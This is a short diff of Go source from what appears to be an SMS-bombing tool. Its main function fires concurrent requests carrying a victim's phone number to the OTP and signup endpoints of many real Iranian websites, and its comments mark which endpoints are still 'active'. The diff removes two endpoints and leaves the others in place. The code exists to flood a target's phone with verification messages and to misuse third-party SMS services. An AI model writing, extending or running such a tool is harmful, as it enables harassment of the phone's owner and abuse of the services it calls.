@@ -249,9 +249,6 @@ func main() {
 		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
 			se: phone,
 		}, ch)  // idon't know ???
-		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // active ✅
  		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
@@ -343,9 +340,6 @@ func main() {
 		go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
-			"phone": phone,
-		}, ch)  // active ✅
 		go sms("https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
